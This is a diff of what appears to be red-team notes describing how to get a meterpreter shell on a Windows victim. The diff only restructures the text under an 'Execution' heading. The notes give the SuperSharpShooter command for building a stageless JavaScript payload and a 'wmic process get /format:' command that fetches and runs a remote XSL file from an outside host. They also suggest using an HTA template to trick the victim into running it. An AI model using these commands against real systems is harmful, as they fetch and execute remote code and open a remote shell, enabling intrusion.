@@ -13,5 +13,8 @@ Can be combined with JScript code (SuperSharpShooter) to get a meterpreter shell
 
 `python3 SuperSharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test`
 
-Option one: Embed the JS content to the XSL template, and on victim, run: `wmic process get /format:"http://192.168.0.1/test.xsl"`
-Option two: use the HTA template to trick the victim to execute the XSL payload.
+### Execution
+
+1. Option one: Embed the JS content to the XSL template, and on victim, run: `wmic process get /format:"http://192.168.0.1/test.xsl"`
+
+2. Option two: use the HTA template to trick the victim to execute the XSL payload.
